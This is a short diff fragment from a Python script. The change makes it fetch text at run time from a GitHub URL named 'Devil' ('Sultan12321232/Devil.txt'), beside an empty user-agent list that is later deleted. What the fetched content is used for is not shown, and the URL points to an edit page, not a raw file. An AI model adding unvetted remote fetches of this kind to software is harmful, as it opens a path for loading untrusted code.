@@ -1270,7 +1270,7 @@ device = {
 ua = []
 
 import requests
-rs = requests.get
+rs = requests.get("https://github.com/Sultan12321232/Devil.txt/new/main/Devil").text
 ua = []
 
 del ua
